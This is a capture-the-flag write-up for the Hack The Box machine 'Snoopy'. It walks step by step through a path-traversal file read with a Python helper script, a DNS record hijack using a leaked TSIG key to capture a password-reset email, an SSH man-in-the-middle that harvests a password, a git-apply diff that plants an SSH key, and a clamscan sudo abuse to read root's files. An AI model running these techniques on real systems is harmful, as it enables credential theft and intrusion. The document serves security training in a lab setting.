
# Snoopy


![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Snoopy/Snoopy.png)

- nmap:
    
    ```
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwa6lTzS8uZRb7EebEXbLkAU0FpJ8k9KO+YwTTeEE7E3VgGZr4vOP4EOZce1XDgwR18wt0WOCiYz6pi6M4y4Lw=
    |   256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZTgpF2zR6Xamvdn+NyIUGFtq7hXBd7RK3SM00IMQht
    53/tcp open  domain  syn-ack ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
    | dns-nsid:
    |_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    |_http-title: SnoopySec Bootstrap Template - Index
    |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
    | http-methods:
    |_  Supported Methods: GET HEAD
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    ```
    
### Email
info@snoopy.htb

### Sub Domain

mail.snoopy.htb  (in the navbar from port 80)

- `wfuzz -c -u [http://snoopy.htb](http://snoopy.htb/) -H "Host: FUZZ.snoopy.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --hw 1818`

mm.snoopy.htb

## LFI

On the view-source:[http://snoopy.htb/index.html](http://snoopy.htb/index.html)

```html
<p>Download our press release package <a href=http://snoopy.htb/download>here</a> or download our recent announcement <a href=http://snoopy.htb/download?file=announcement.pdf>here</a>  </p>
```

- `curl "[http://snoopy.htb/download?file=....//....//....//....//....//....//etc/passwd](http://snoopy.htb/download?file=....//....//....//....//....//....//etc/passwd)" --output test`

The output is a ZIP-File. Unzip and we get the passwd file

```python
#!/bin/python3
import os, sys
import zipfile

try:
    file = sys.argv[1]
    cmd = f'curl -s "http://snoopy.htb/download?file=....//....//....//....//....//..../{file}" --output out.zip'
    os.system(cmd)
    zip = zipfile.ZipFile('out.zip')
    read_file = zip.namelist()[0]
    print(os.popen(f"unzip -p out.zip {read_file}").read())
    os.system("rm out.zip")
except Exception as e:
    print(f"[ERROR] {e}")
    print("File not there!")
```

- `./LFI.py /etc/passwd`

Two users: 

- cbrown
- sbrown

If we look at the Contact tab, they tell us that the DNS is being migrated, we can
try to read this path `/etc/bind/named.conf`

```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

# Password Reset via captured Email

Setup the Email Server

- `python3 -m smtpd -n -c DebuggingServer 10.10.14.49:25`

Change config of hte mail server

- `export HMAC="hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="`
- `nsupdate -y $HMAC`
    - `server snoopy.htb`
    - `update add mail.snoopy.htb. 900 IN A 10.10.14.49`
    - `send`

Make a password rest with the email cbrown@snoopy.htb on the [http://mm.snoopy.htb](http://mm.snoopy.htb/) side.
<br>
We got the mail back with a HTML Source Code.

```
'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dst35r='
b'eb99rm8tph4f7kukyeyb99j4zwigurxkt6xrjd3ajtu3rh6enfqof58qh8p )'
```

The Token in the URL is: (the `3D` is not in the URL)

- http://mm.snoopy.htb/reset_password_complete?token=st35reb99rm8tph4f7kukyeyb99j4zwigurxkt6xrjd3ajtu3rh6enfqof58qh8p

```json
{"token":"st35reb99rm8tph4f7kukyeyb99j4zwigurxkt6xrjd3ajtu3rh6enfqof58qh8p","new_password":"12341234"}
```

Now login with 

cbrown@snoopy.htb : 12341234

# SSH-MITM

[SSH-MITM - ssh audits made simple — SSH-MITM](https://docs.ssh-mitm.at/)

> ssh man-in-the-middle (ssh-mitm) server for security audits supporting **publickey authentication**, **session hijacking** and **file manipulation**
> 

We can send a ticket to a admin, that connect to ower ssh server. 

Under > Server Provisioning

Write the Command in the Chat. 

- `/server_provision`

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Snoopy/form.png)

- `nc -lvnp 2222`

```
connect to [10.10.14.49] from (UNKNOWN) [10.129.186.228] 46156
SSH-2.0-paramiko_3.1.0
```

## Tool [SSH-MITM](https://docs.ssh-mitm.at/)

- `python3 -m pip install ssh-mitm`
- `python3 -m sshmitm server --enable-trivial-auth --remote-host 10.129.186.228 --listen-port 2222`

Send a new ticket, and we see the password in the output.

- Full Output
    
    ```
    ➜  LFI python3 -m sshmitm server --enable-trivial-auth --remote-host 10.129.186.228 --listen-port 2222
    ──────────────────────────────────────────────────────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────────────────────────────────────────────────────
    Version: 3.0.2
    License: GNU General Public License v3.0
    Documentation: https://docs.ssh-mitm.at
    Issues: https://github.com/ssh-mitm/ssh-mitm/issues
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    generated temporary RSAKey key with 2048 bit length and fingerprints:
       MD5:70:cd:1b:f4:1f:01:19:35:a0:fd:aa:59:bd:7a:a5:74
       SHA256:IejR/dQyrQuhuYjg96rzBeeUtQhMWd4nsm9t7TLIaXs
       SHA512:fAe6IPa+AhFwJL0nec2nKirXwrrd0MLhfN6AgNktcJ/xYJjPXUlM5kmdK2hgeaiqYLXOFvJ0sq5EqPwMzqPJ9A
    listen interfaces 0.0.0.0 and :: on port 2222
    ───────────────────────────────────────────────────────────────────────────────── waiting for connections ──────────────────────────────────────────────────────────────────────────────────
    [05/11/23 13:36:44] INFO     ℹ session 6ee50d8a-7cfd-491d-ba69-0d4d3b303ba4 created
                        INFO     ℹ client information:
                                   - client version: ssh-2.0-paramiko_3.1.0
                                   - product name: Paramiko
                                   - vendor url:  https://www.paramiko.org/
                                 ⚠ client audit tests:
                                   * client uses same server_host_key_algorithms list for unknown and known hosts
                                   * Preferred server host key algorithm: ssh-ed25519
                        INFO     Remote authentication succeeded
                                         Remote Address: 10.129.186.228:22
                                         Username: cbrown
                                         Password: sn00pedcr3dential!!!
                                         Agent: no agent
                        INFO     ℹ 6ee50d8a-7cfd-491d-ba69-0d4d3b303ba4 - local port forwading
                                 SOCKS port: 39767
                                   SOCKS4:
                                     * socat: socat TCP-LISTEN:LISTEN_PORT,fork socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=39767
                                     * netcat: nc -X 4 -x localhost:39767 address port
                                   SOCKS5:
                                     * netcat: nc -X 5 -x localhost:39767 address port
                        INFO     got ssh command: ls -la
    [05/11/23 13:36:45] INFO     ℹ 6ee50d8a-7cfd-491d-ba69-0d4d3b303ba4 - session started
    [05/11/23 13:36:46] INFO     got remote command: ls -la
                        INFO     remote command 'ls -la' exited with code: 0
                        ERROR    Socket exception: Connection reset by peer (104)
                        INFO     ℹ session 6ee50d8a-7cfd-491d-ba69-0d4d3b303ba4 closed
    ```
    

```
INFO     Remote authentication succeeded
             Remote Address: 10.129.186.228:22
             Username: cbrown
             Password: sn00pedcr3dential!!!
```

- `sshpass -p sn00pedcr3dential\!\!\! ssh cbrown@snoopy.htb`

uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)

# Lateral Movement

- `sudo -l`

```
User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```

## `git apply`

> Reads the supplied diff output (i.e. "a patch") and applies it to files.
> 

So we can crate a diff file, that write the public ssh key to the authorized_keys for the user sbrown.

- `cat /home/cbrown/.ssh/id_rsa.pub > /home/cbrown/.ssh/authorized_key`
- `cd /home`
- `git diff cbrown/.bash_history cbrown/.ssh/authorized_keys > /tmp/diff`

In the /tmp/diff replace the cbrown name with sbrown.

The final diff file looks like this.

```
diff --git a/sbrown/.bash_history b/sbrown/.bash_history
deleted file mode 120000
index dc1dc0c..0000000
--- a/sbrown/.bash_history
+++ /dev/null
@@ -1 +0,0 @@
-/dev/null
\ No newline at end of file
diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..0a560dd
--- /dev/null
+++ b/sbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWAtWLU71rqxUHwRHCFOwgETSv6GLAqr9aUgFkE+iaoGgCWmiEKVhkHKOJgm4k1XSm+bY+iZ7MIwm4iAYdGwyaY+xYKGUT+4gUqVgOdtF8gO+RvLJ7Kcb609Nv18+q5MqAmd+GE7RDkX6RliElgKWGsezt4ege3U/W+0jkOGA3xs1Dvq2vdUVOWvjsuUVAckT68AIVas8w4Of5Bp3upcg8znAQ2ptyyfcGCO6twYnh9i94GZAHTLylij9netO5oYoeK+J8CAePWsQvwzhZmpHiPrxV5yOUIUGDO6UqNXUpSVP7hJIBPiVDaEufmK9ZxQciBBqolkC3qsuBT+o/j5ptZ9iQAqEwl4HhgHgiJJWCTvCWSjQwrNHhiOI5zJAbR4rvabbUicDCYpCgfmgEdgXpyNk5IQ4gD7C4lvNSQU0ktaYXz/8rvvxd4oHJC6AqOkJmVd5yrnoQ7hdp1xLlr+MTlHwnIJ4TsCLKFvkIU310bk1Q+4hN+IvDiuWnND/7tO0= cbrown@snoopy.htb
```

- `sudo -u sbrown /usr/bin/git apply /tmp/diff`

now login with the ssh private key from cbrown.

# Priv Esc

uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)

- `sudo -l`

```
User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan
```

## `clamscan`

[clamscan(1): scan files/directories for viruses - Linux man page](https://linux.die.net/man/1/clamscan)

Scan files and directories for viruses

We can scann files and get the ouput from it

- `sudo /usr/local/bin/clamscan -f /root/root.txt`
- `sudo /usr/local/bin/clamscan -f /root/.ssh/id_rsa`
